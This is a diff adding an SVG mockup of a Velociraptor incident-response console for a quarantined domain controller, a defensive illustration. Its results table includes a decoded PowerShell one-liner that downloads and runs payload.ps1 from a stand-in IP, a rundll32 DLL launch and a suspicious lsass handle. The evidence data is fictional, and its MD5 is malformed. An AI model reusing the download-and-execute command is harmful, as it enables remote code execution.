@@ -1,0 +1,149 @@
+<svg viewBox="0 0 1440 900" xmlns="http://www.w3.org/2000/svg" font-family="'Segoe UI',Arial,sans-serif">
+  <rect width="1440" height="900" fill="#0d1117"/>
+  <defs>
+    <linearGradient id="urlbar" x1="0" x2="0" y1="0" y2="1">
+      <stop offset="0" stop-color="#3c3c3c"/><stop offset="1" stop-color="#2d2d2d"/>
+    </linearGradient>
+  </defs>
+  <!-- Browser Chrome Bar -->
+  <rect width="1440" height="78" fill="#1f1f1f"/>
+  <rect width="1440" height="40" fill="#2d2d2d"/>
+  <circle cx="20" cy="20" r="6" fill="#ff5f57"/>
+  <circle cx="40" cy="20" r="6" fill="#febc2e"/>
+  <circle cx="60" cy="20" r="6" fill="#28c840"/>
+  <path d="M 90 40 Q 100 40 105 32 L 115 12 Q 120 4 130 4 L 380 4 Q 390 4 395 12 L 405 32 Q 410 40 420 40 Z" fill="#1f1f1f"/>
+  <circle cx="135" cy="22" r="7" fill="#00a3e0"/>
+  <text x="131" y="26" font-size="10" fill="#fff" font-weight="bold" font-family="monospace">🦖</text>
+  <text x="155" y="26" font-size="11.5" fill="#e6edf3">Velociraptor — Endpoint Hunt &amp; Forensics</text>
+  <text x="390" y="26" font-size="14" fill="#8b949e">×</text>
+  <text x="440" y="26" font-size="11" fill="#8b949e">+ New Tab</text>
+  <text x="20" y="62" font-size="14" fill="#8b949e">←</text>
+  <text x="44" y="62" font-size="14" fill="#8b949e">→</text>
+  <text x="68" y="62" font-size="14" fill="#8b949e">⟳</text>
+  <rect x="92" y="48" width="1240" height="22" rx="11" fill="url(#urlbar)" stroke="#1a1a1a"/>
+  <text x="106" y="63" font-size="10" fill="#28c840">🔒</text>
+  <text x="122" y="63" font-size="11" fill="#cccccc" font-family="monospace">https://velociraptor.lab.local:8889/#/clients/C.10a9b8f742e6/vfs</text>
+  <text x="1350" y="62" font-size="14" fill="#8b949e">⋮</text>
+
+  <!-- Top App Navigation -->
+  <rect x="0" y="78" width="1440" height="48" fill="#161b22"/>
+  <rect x="0" y="125" width="1440" height="1" fill="#30363d"/>
+  <text x="24" y="108" font-size="16" fill="#00a3e0" font-weight="bold">🦖 VELOCIRAPTOR</text>
+  <text x="200" y="108" font-size="12" fill="#8b949e">Server: <tspan fill="#3fb950" font-weight="bold">ONLINE (v0.72.0)</tspan></text>
+  <text x="380" y="108" font-size="12" fill="#8b949e">Active Clients: <tspan fill="#58a6ff" font-weight="bold">248 connected</tspan></text>
+  <rect x="1080" y="88" width="210" height="26" rx="4" fill="#21262d" stroke="#30363d"/>
+  <text x="1092" y="105" font-size="11" fill="#c9d1d9">🔍 Hunt: Suspicious PowerShell</text>
+  <rect x="1300" y="88" width="110" height="26" rx="4" fill="#1f6feb"/>
+  <text x="1318" y="105" font-size="11" fill="#fff" font-weight="bold">+ New Hunt</text>
+
+  <!-- Left Sidebar -->
+  <rect x="0" y="126" width="220" height="774" fill="#0d1117" stroke="#30363d"/>
+  <text x="20" y="156" font-size="10" fill="#8b949e" font-weight="bold">NAVIGATION</text>
+  <rect x="10" y="168" width="200" height="32" rx="4" fill="#161b22"/>
+  <text x="28" y="189" font-size="12" fill="#58a6ff" font-weight="bold">💻 Host Search</text>
+  <text x="28" y="225" font-size="12" fill="#8b949e">🎯 Hunt Manager</text>
+  <text x="28" y="261" font-size="12" fill="#8b949e">📂 VFS Browser</text>
+  <text x="28" y="297" font-size="12" fill="#8b949e">⚡ Live VQL Console</text>
+  <text x="28" y="333" font-size="12" fill="#8b949e">📜 Artifact Definitions</text>
+  <text x="28" y="369" font-size="12" fill="#8b949e">🛡 Quarantine Manager</text>
+  <text x="28" y="405" font-size="12" fill="#8b949e">⚙ Server Settings</text>
+
+  <!-- Client Header Card -->
+  <rect x="236" y="140" width="1184" height="90" rx="6" fill="#161b22" stroke="#30363d"/>
+  <circle cx="270" cy="175" r="22" fill="#00a3e0" fill-opacity="0.2"/>
+  <text x="260" y="182" font-size="20">🖥</text>
+  <text x="306" y="168" font-size="16" fill="#e6edf3" font-weight="bold">Host: WIN-DC-01.corp.lab (Primary Domain Controller)</text>
+  <text x="306" y="190" font-size="11" fill="#8b949e">Client ID: <tspan fill="#79c0ff" font-family="monospace">C.10a9b8f742e6</tspan>  ·  IP: <tspan fill="#e6edf3" font-family="monospace">10.20.4.18</tspan>  ·  OS: Windows Server 2022 Datacenter</text>
+  <text x="306" y="210" font-size="11" fill="#8b949e">Isolation Status: <tspan fill="#f85149" font-weight="bold">🔒 QUARANTINED (SOAR Triggered)</tspan>  ·  Policy: Auto-Containment Active</text>
+  <rect x="1080" y="155" width="130" height="28" rx="4" fill="#238636"/>
+  <text x="1094" y="173" font-size="11" fill="#fff" font-weight="bold">⚡ Collect Artifacts</text>
+  <rect x="1220" y="155" width="180" height="28" rx="4" fill="#da3633"/>
+  <text x="1234" y="173" font-size="11" fill="#fff" font-weight="bold">🔓 Remove Quarantine</text>
+
+  <!-- VQL Hunt Results Tab Bar -->
+  <rect x="236" y="246" width="1184" height="34" rx="4" fill="#21262d"/>
+  <text x="256" y="268" font-size="12" fill="#58a6ff" font-weight="bold">VQL Artifact: Windows.Detection.Powershell.Encoded</text>
+  <text x="650" y="268" font-size="11" fill="#8b949e">Artifacts Collected: <tspan fill="#e6edf3" font-weight="bold">14 records</tspan></text>
+  <text x="850" y="268" font-size="11" fill="#8b949e">Execution Time: <tspan fill="#3fb950" font-weight="bold">0.42 seconds</tspan></text>
+  <text x="1150" y="268" font-size="11" fill="#58a6ff">Export JSON / CSV ⤓</text>
+
+  <!-- VQL Query Box -->
+  <rect x="236" y="292" width="1184" height="54" rx="6" fill="#0d1117" stroke="#30363d"/>
+  <text x="252" y="312" font-size="10" fill="#7ee787" font-family="monospace">SELECT Pid, Name, CommandLine, ParentPid, Username, Timestamp, Authenticode.Signer </text>
+  <text x="252" y="332" font-size="10" fill="#7ee787" font-family="monospace">FROM Artifact.Windows.System.ProcessInfo() WHERE CommandLine =~ "-(?i)(enc|encodedcommand|downloadstring)"</text>
+
+  <!-- Forensic Results Table -->
+  <rect x="236" y="358" width="1184" height="360" rx="6" fill="#161b22" stroke="#30363d"/>
+  <rect x="236" y="358" width="1184" height="28" fill="#21262d"/>
+  <text x="250" y="377" font-size="10" fill="#8b949e" font-weight="bold">PID</text>
+  <text x="310" y="377" font-size="10" fill="#8b949e" font-weight="bold">NAME</text>
+  <text x="430" y="377" font-size="10" fill="#8b949e" font-weight="bold">PARENT PROCESS</text>
+  <text x="590" y="377" font-size="10" fill="#8b949e" font-weight="bold">USER</text>
+  <text x="700" y="377" font-size="10" fill="#8b949e" font-weight="bold">COMMAND LINE (DECODED PREVIEW)</text>
+  <text x="1100" y="377" font-size="10" fill="#8b949e" font-weight="bold">STATUS / SIGNER</text>
+  <text x="1340" y="377" font-size="10" fill="#8b949e" font-weight="bold">ACTIONS</text>
+
+  <!-- Row 1: Suspicious PowerShell -->
+  <rect x="236" y="388" width="1184" height="48" fill="#0d1117" fill-opacity="0.8"/>
+  <rect x="236" y="388" width="4" height="48" fill="#f85149"/>
+  <text x="250" y="412" font-size="11" fill="#f85149" font-family="monospace" font-weight="bold">4912</text>
+  <text x="310" y="412" font-size="11" fill="#e6edf3" font-family="monospace">powershell.exe</text>
+  <text x="430" y="412" font-size="11" fill="#d29922">WINWORD.EXE (PID: 3820)</text>
+  <text x="590" y="412" font-size="11" fill="#c9d1d9">CORP\svc_backup</text>
+  <text x="700" y="408" font-size="10" fill="#79c0ff" font-family="monospace">powershell -W Hidden -enc SQBFAFgAIAAoAE4AZQB3... </text>
+  <text x="700" y="424" font-size="9.5" fill="#3fb950" font-family="monospace">↳ Decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.44/payload.ps1')</text>
+  <rect x="1100" y="400" width="90" height="20" rx="3" fill="#da3633" fill-opacity="0.3"/>
+  <text x="1110" y="414" font-size="9" fill="#f85149" font-weight="bold">UNSIGNED</text>
+  <text x="1340" y="414" font-size="11" fill="#58a6ff">Kill / Dump</text>
+
+  <!-- Row 2: Secondary Injection -->
+  <rect x="236" y="438" width="1184" height="44" fill="#161b22"/>
+  <rect x="236" y="438" width="4" height="44" fill="#f85149"/>
+  <text x="250" y="464" font-size="11" fill="#f85149" font-family="monospace" font-weight="bold">5104</text>
+  <text x="310" y="464" font-size="11" fill="#e6edf3" font-family="monospace">rundll32.exe</text>
+  <text x="430" y="464" font-size="11" fill="#f85149">powershell.exe (PID: 4912)</text>
+  <text x="590" y="464" font-size="11" fill="#c9d1d9">CORP\svc_backup</text>
+  <text x="700" y="464" font-size="10" fill="#79c0ff" font-family="monospace">rundll32.exe C:\Users\Public\update.dll,DllRegisterServer</text>
+  <rect x="1100" y="452" width="90" height="20" rx="3" fill="#da3633" fill-opacity="0.3"/>
+  <text x="1110" y="466" font-size="9" fill="#f85149" font-weight="bold">UNSIGNED</text>
+  <text x="1340" y="466" font-size="11" fill="#58a6ff">Kill / Dump</text>
+
+  <!-- Row 3: Benign PowerShell Scheduled Task -->
+  <rect x="236" y="484" width="1184" height="44" fill="#0d1117" fill-opacity="0.4"/>
+  <rect x="236" y="484" width="4" height="44" fill="#3fb950"/>
+  <text x="250" y="510" font-size="11" fill="#3fb950" font-family="monospace">2140</text>
+  <text x="310" y="510" font-size="11" fill="#e6edf3" font-family="monospace">powershell.exe</text>
+  <text x="430" y="510" font-size="11" fill="#8b949e">taskeng.exe (PID: 1044)</text>
+  <text x="590" y="510" font-size="11" fill="#c9d1d9">NT AUTHORITY\SYSTEM</text>
+  <text x="700" y="510" font-size="10" fill="#8b949e" font-family="monospace">powershell.exe -ExecutionPolicy Restricted -File C:\Scripts\health_check.ps1</text>
+  <rect x="1100" y="498" width="120" height="20" rx="3" fill="#238636" fill-opacity="0.3"/>
+  <text x="1110" y="512" font-size="9" fill="#3fb950" font-weight="bold">SIGNED (Microsoft Corp)</text>
+  <text x="1340" y="512" font-size="11" fill="#8b949e">Inspect</text>
+
+  <!-- Row 4: LSASS Handle -->
+  <rect x="236" y="530" width="1184" height="44" fill="#161b22"/>
+  <rect x="236" y="530" width="4" height="44" fill="#d29922"/>
+  <text x="250" y="556" font-size="11" fill="#d29922" font-family="monospace">684</text>
+  <text x="310" y="556" font-size="11" fill="#e6edf3" font-family="monospace">lsass.exe</text>
+  <text x="430" y="556" font-size="11" fill="#8b949e">wininit.exe (PID: 588)</text>
+  <text x="590" y="556" font-size="11" fill="#c9d1d9">NT AUTHORITY\SYSTEM</text>
+  <text x="700" y="556" font-size="10" fill="#8b949e" font-family="monospace">C:\Windows\system32\lsass.exe [Suspicious open handle from PID 4912 detected]</text>
+  <rect x="1100" y="544" width="120" height="20" rx="3" fill="#238636" fill-opacity="0.3"/>
+  <text x="1110" y="558" font-size="9" fill="#3fb950" font-weight="bold">PROTECTED LSA</text>
+  <text x="1340" y="558" font-size="11" fill="#8b949e">Inspect</text>
+
+  <!-- Live Evidence Acquisition Panel at Bottom -->
+  <rect x="236" y="730" width="580" height="150" rx="6" fill="#161b22" stroke="#30363d"/>
+  <text x="256" y="756" font-size="13" fill="#e6edf3" font-weight="bold">🔬 Acquired Forensic Evidence Ledger</text>
+  <text x="256" y="782" font-size="11" fill="#8b949e">● Memory Dump: <tspan fill="#79c0ff" font-family="monospace">WIN-DC-01-memdump.raw (2.4 GB)</tspan> — MD5: d41d8cd98f00b204e9800998</text>
+  <text x="256" y="806" font-size="11" fill="#8b949e">● Prefetch Files: <tspan fill="#79c0ff" font-family="monospace">POWERSHELL.EXE-24B8C11A.pf, RUNDLL32.EXE-1142A99B.pf</tspan></text>
+  <text x="256" y="830" font-size="11" fill="#8b949e">● Live Sockets: <tspan fill="#f85149" font-family="monospace">ESTABLISHED 10.20.4.18:49811 -> 198.51.100.44:443 (PID 4912)</tspan></text>
+  <text x="256" y="854" font-size="11" fill="#8b949e">● Evidence Bundle: <tspan fill="#3fb950" font-weight="bold">Synced to DFIR-IRIS Case #2026-CASE-00184</tspan></text>
+
+  <rect x="836" y="730" width="584" height="150" rx="6" fill="#161b22" stroke="#30363d"/>
+  <text x="856" y="756" font-size="13" fill="#e6edf3" font-weight="bold">🛡 SOAR Automated Containment State</text>
+  <text x="856" y="782" font-size="11" fill="#8b949e">Isolation Engine: <tspan fill="#3fb950">Velociraptor VQL Network Quarantine Driver (WFP)</tspan></text>
+  <text x="856" y="806" font-size="11" fill="#8b949e">Quarantine Rule: <tspan fill="#e6edf3" font-family="monospace">BLOCK ALL traffic EXCEPT 172.20.0.19:8001 (Velociraptor Server)</tspan></text>
+  <text x="856" y="830" font-size="11" fill="#8b949e">Rollback Handler: <tspan fill="#79c0ff">soc_autonomous.unisolate_host (Token: rb_9b71a24e)</tspan></text>
+  <text x="856" y="854" font-size="11" fill="#8b949e">Audit Verification: <tspan fill="#3fb950">Signed HMAC-SHA256 by Autonomous Policy Engine</tspan></text>
+</svg>
